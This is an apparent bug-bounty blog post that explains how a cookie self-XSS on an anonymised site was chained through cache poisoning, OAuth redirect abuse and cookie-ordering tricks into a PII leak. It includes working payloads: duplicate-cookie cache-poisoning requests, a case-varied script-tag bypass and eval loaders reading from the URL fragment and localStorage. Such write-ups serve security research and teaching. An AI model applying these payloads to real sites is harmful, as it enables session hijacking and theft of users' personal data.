# Turning a “Useless” Self-XSS into a Full PII Leak Through Bug Chaining

> **Author**: Parsa Riyahi
> **Published**: Nov 28, 2025

---

![Parsa Riyahi](https://miro.medium.com/v2/resize:fill:32:32/1*JOP2qNNuQ-6znlpw76VLwg.jpeg)

79

1

Listen

Share

![image](https://miro.medium.com/v2/resize:fit:700/1*pZm5N4Cs8CAf2fVGMtsHgg.jpeg)

First, the technical flow:
Cookie-based self-XSS → cache poisoning → reflected XSS → OAuth redirection abuse → reflected XSS → PII leak

I was testing a target and found cookie reflection. I ran payload variations. The reflection landed inside a <script> tag. I first tried </script><script>alert()</script> and the target dropped the script. Next I used </SCRIPT><SCRIPT>alert()</SCRIPT> and it executed. The XSS triggered, but it was still a self-XSS and not exploitable under normal conditions.

After some recon, something caught my eye and the idea triggered immediately.

![image](https://miro.medium.com/v2/resize:fit:226/1*jsLRU5KteNrisfTWL-FBQA.png)

If I could cache my payload, the self-XSS would escalate into a reflected XSS via cache poisoning. I began examining the target’s static files and the behavior of its caching system.

I found that caching used two cookies as cache keys: shippingCountry=US; currency=USD;. The bad news was that my self-XSS sat in the currency cookie.

I couldn’t poison the cache if my payload was a cache key, right? Not necessarily. Most bugs come from inconsistencies between subsystems. My idea was to send multiple cookies with the same name but different values, like this:

```
GET / HTTP/2
Host: www.target.com
Cookie: shippingCountry=US; currency=USD; currency=</SCRIPT><SCRIPT>alert()</SCRIPT>;
```

The caching layer used the first value, but the application used the second. That mismatch let me poison the cache with my payload.

But it wasn’t easy. The shippingCountry=US; currency=USD; combination is common, so the odds of keeping my poisoned cache entry were low. Many legitimate requests could overwrite it. I dug into how the site set these values. After more recon in the JavaScript files, I found this code:

```
const shippingCountry = searchParams.get('shippingcountry')
const switchCurrency = searchParams.get('switchcurrency')

const currencyRegEx = /^[A-Z]{3}$/
const shippingRegEx = /^[A-Z]{2}$/

if (
  (getCookie(`currency`) &&
    !currencyRegEx.test(getCookie(`currency`))) ||
  (getCookie(`shippingCountry`) &&
    !shippingRegEx.test(getCookie(`shippingCountry`)))
) {
  window.location.href =
    window.location.pathname +
    `?switchcurrency=${window.tenantConfig.application.settings.defaultCurrency}&shippingcountry=${window.tenantConfig.application.settings.defaultCountry}`
}

if (shippingCountry && shippingRegEx.test(shippingCountry)) {
  document.cookie = `shippingCountry=${shippingCountry}; path=/; secure; domain=${rootDomain(
    host
  )}; expires=${oneYearExpire.toUTCString()}`
}
if (switchCurrency && currencyRegEx.test(switchCurrency)) {
  document.cookie = `currency=${switchCurrency}; path=/; secure; domain=${rootDomain(
    host
  )}; expires=${oneYearExpire.toUTCString()}`
}
```

Now chain everything. First, poison the cache with a custom cookie combination that passes the regex, like this:

```
GET / HTTP/2
Host: www.target.com
Cookie: shippingCountry=AB; currency=ABC; currency=</SCRIPT><SCRIPT>alert()</SCRIPT>;
```

Then change the victim’s values like this: www.target.com?switchcurrency=PAP&shippingcountry=PA

And now the self-XSS, delivered through cache poisoning, becomes a valid reflected XSS. Finding an XSS is one task; exploiting it is another.

I tried to escalate it. I went through the OAuth flow. The domain was completely separate (www.targetauth.com), and the token exchange happened over a POST request, so stealing the token was off the table. But the state parameter included a returnTo value that controlled the post-login redirect. That was the opening.

My idea looked odd, but it held. Poison the cache, send the user to the login page, have them authenticate, redirect them back to the poisoned page, trigger the second XSS, and exfiltrate their data.

## Get Parsa Riyahi’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

I started testing the target. I could push users into the OAuth flow, they returned, and the first problem appeared immediately. During the post‑login redirect, the site reset the cookie values. After the redirect, their cookies looked like this:

```
GET / HTTP/2
Host: www.target.com
Cookie: shippingCountry=AB; currency=ABC; shippingCountry=US; currency=USD;
        AUTH_TOKEN=TOKEN;
```

Another odd detail: the AUTH_TOKEN cookie was also a cache key. Once it was set, my initial cache poison became useless again.

I needed a second XSS here to run the exfiltration payload, so the victim’s cookies had to look like this:

```
GET / HTTP/2
Host: www.target.com
Cookie: shippingCountry=AB; currency=ABC; shippingCountry=US; currency=USD;
        AUTH_TOKEN=TOKEN; currency=</SCRIPT><SCRIPT>alert(SECOND XSS)</SCRIPT>;
```

I started researching how browsers order cookies for sending and found the algorithm:

Path Specificity (Most Important)
Cookies with more specific paths are sent before those with less specific paths.
Cookie Creation Time (Tie-Breaker)
For cookies with the same path length, older cookies are sent first.

My idea was to rewrite the cookies in the first XSS. When the victim returned from the login flow, I would overwrite the cookie with currency=</SCRIPT><SCRIPT>alert(SECOND XSS)</SCRIPT>;. But rewriting the cookie on the same page doesn’t change its creation time. If I set the cookie during the first XSS, my cookie becomes older than the post‑login cookie. The browser sends the older one first, and the second XSS never triggers.

At this point, I was really frsutrated, each time I got to a closed door, but I kept going in reaseatch and tested different scenarios, and finally found the solution.

I needed my cookie to be set after the post‑login cookie. In the first XSS, I created a loop that ran every millisecond and checked whether the post‑login cookie existed. Once it appeared, I set my own cookie. That ensured my cookie was created later, giving it a newer creation time. The code looked like this:

```
function setCookie(name, value, days) {
    if (document.cookie.includes('currency=USD')) {
        const expires = new Date();
        expires.setTime(expires.getTime() + (days * 24 * 60 * 60 * 1000));
        document.cookie = `${name}=${value};expires=${expires.toUTCString()};path=/`;
        console.log(document.cookie)
    }
}

setInterval(() => {
    setCookie('currency', `</SCRIPT><SCRIPT>alert('SECOND XSS')</SCRIPT>`, 366);
}, 1);
```

The final victim cookies looked like this, and the alert appeared in the response of the post‑login redirect.

```
GET / HTTP/2
Host: www.target.com
Cookie: shippingCountry=AB; currency=ABC; shippingCountry=US; currency=USD;
        AUTH_TOKEN=TOKEN; currency=</SCRIPT><SCRIPT>alert(SECOND XSS)</SCRIPT>;
```

Now I had the XSS and needed to exploit it. The challenge was fitting the payload into the currency cookie because it had a strict size limit. For the first XSS, I used this payload:

```
</SCRIPT><SCRIPT>eval(decodeURI(atob(window.location.hash.slice(1))))</SCRIPT>
```

I put the exploit in the fragment when sending the victim to the XSS page. But the second XSS still needed its own payload. I had to store it somewhere the second XSS could read and execute. Options were query strings, cookies, or local storage. Query strings were dropped after the post‑login redirect. Cookies caused issues because the server behaved unpredictably when the request headers became too large. The remaining option was local storage.

The second XSS payload was this:

```
</SCRIPT><SCRIPT>eval(decodeURI(atob(localStorage.getItem('payload'))))</SCRIPT>
```

So the scenario is: the attacker poisons the page with an XSS payload that reads the fragment and executes it. The fragment payload stores the second payload — the data-exfiltration code — into local storage. It then waits for the post-login cookie to appear. Once it does, the attacker sets their own cookie. When the victim is redirected, the second XSS triggers, loads the payload from local storage, and exfiltrates the victim’s data to an attacker-controlled endpoint.

Final chain: self-XSS → cache poisoning → reflected XSS → OAuth flow → cookie rewriting → post-login redirect → second XSS → PII leak

Before this bug, most of my findings were simple XSS that escalated into ATO or PII leaks with straightforward flows. This one forced real learning. Beyond technical details like browser cookie-ordering behavior, it taught process: how to think, how to use available gadgets, how to avoid stopping early, how to keep pushing, how to expand recon, how to document findings, and how to chain components into an impactful exploit.



---
*Original URL: [https://medium.com/@pany.parsariyahi/turning-a-useless-self-xss-into-a-full-pii-leak-through-bug-chaining-57ae89dc9f76?source=search_post---------136-----------------------------------](https://medium.com/@pany.parsariyahi/turning-a-useless-self-xss-into-a-full-pii-leak-through-bug-chaining-57ae89dc9f76?source=search_post---------136-----------------------------------)*
